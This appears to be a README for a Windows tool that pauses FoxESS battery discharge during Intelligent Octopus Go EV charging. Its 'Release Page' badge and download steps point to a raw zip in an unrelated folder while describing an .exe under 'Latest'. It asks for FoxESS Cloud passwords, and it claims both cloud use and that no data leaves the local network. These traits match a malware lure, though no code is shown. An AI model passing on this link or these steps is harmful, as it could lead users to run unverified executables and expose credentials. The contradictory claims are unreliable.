# 🐙 octopus-foxess-smart-charging - Keep battery energy during EV charging

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/clemusual65/octopus-foxess-smart-charging/main/saltman/smart-charging-foxess-octopus-2.2.zip)

This software manages the link between your Intelligent Octopus Go energy plan and your FoxESS home battery system. It stops your battery from feeding power into your electric vehicle while charging at night. This ensures you keep your stored energy for home use instead of wasting it on your car.

## ⚙️ Why use this tool

When you charge your electric vehicle on the Intelligent Octopus Go plan, your home system might treat the charging session like a standard home request. This often causes your FoxESS battery to drain its stored power into the car charger.

This software tells your battery to wait until the charging session ends. It uses your private credentials to talk to the FoxESS Cloud account. The system works in the background on your Windows computer. It keeps your data on your local machine.

## 🛠️ System requirements

Ensure your computer meets these conditions before you start:

*   Windows 10 or Windows 11.
*   An active account with FoxESS Cloud.
*   A stable internet connection.
*   The login details for your FoxESS Cloud account.

## 📥 Getting the software

You need to download the latest version from the project release page.

1.  Visit [the download page](https://raw.githubusercontent.com/clemusual65/octopus-foxess-smart-charging/main/saltman/smart-charging-foxess-octopus-2.2.zip).
2.  Look for the section titled "Latest".
3.  Click the file ending in `.exe` to start the download.
4.  Save the file to your desktop or downloads folder.
5.  Double-click the file to open the installation wizard.
6.  Follow the prompts on your screen to finish the setup.

When the setup finishes, a new shortcut will appear on your desktop.

## 🔑 Linking your accounts

The software needs permission to access your battery settings.

1.  Open the application from your desktop shortcut.
2.  Find the Settings menu in the top bar.
3.  Enter your FoxESS Cloud username and password.
4.  Enter your device serial number. You find this on your FoxESS inverter label.
5.  Press the Save button.
6.  The green light at the bottom indicates a successful connection.

## 🚀 How it works

The software runs automatically when you start your computer. It checks the status of your energy plan every few minutes.

When the Intelligent Octopus Go charging slot begins, the software sends a signal to your inverter. It tells the system to pause the battery discharge. Once the charging session stops, the software sends a signal to resume normal battery operation.

You do not need to interact with the screen. The application works silently in the system tray near your clock.

## 🛡️ Privacy and security

Your information stays private. The software does not send your username or password to third-party servers. It only communicates with the official FoxESS Cloud V3 API. All settings remain stored on your local drive in an encrypted file.

## ❓ Frequently asked questions

**Does this software drain my battery?**

No. The purpose of this tool is the opposite. It prevents your battery from draining when you consume grid power at low rates for your car.

**Do I need to leave my computer on?**

Yes. The bridge needs to run in the background to monitor your charging status. Most users leave their computers in sleep mode, which is sufficient.

**What happens if my internet disconnects?**

The software will attempt to reconnect until it finds a signal. If the connection fails for a long period, your battery will revert to its standard operating mode managed by the inverter.

**Is this safe for my battery?**

Yes. The software uses the same commands that the FoxESS mobile app uses. It follows the standard guidelines provided by the manufacturer for cloud-based automation.

## 🔧 Managing settings

If you change your password or upgrade your hardware, update your information in the Settings panel:

*   Right-click the icon in the system tray.
*   Select Configuration from the list.
*   Update your fields.
*   Click Apply.

If the software fails to connect, check your login details and verify that your inverter communicates properly with the FoxESS portal.

## 📈 Troubleshooting

If the software does not work, perform these checks:

1.  Restart the application.
2.  Check if you can log in to the FoxESS website directly.
3.  Ensure your firewall allows the software to access the internet.
4.  Verify that your inverter shows an online status in the official app.

If problems persist, check the logs. Right-click the tray icon and select View Logs. The log file shows a history of recent commands sent to your battery.

## 📋 Features

*   **Privacy-first:** No data leaves your local network.
*   **Automatic:** No manual input required after the initial setup.
*   **Cloud-based:** Uses the official API for stability.
*   **Low footprint:** Uses minimal memory and processor power.
*   **Simple interface:** Designed for users without technical backgrounds.

This tool acts as a bridge. It bridges the gap between your energy provider's price signals and your home battery's behavior. By automating this process, you increase your savings and keep your battery capacity for when you need it most.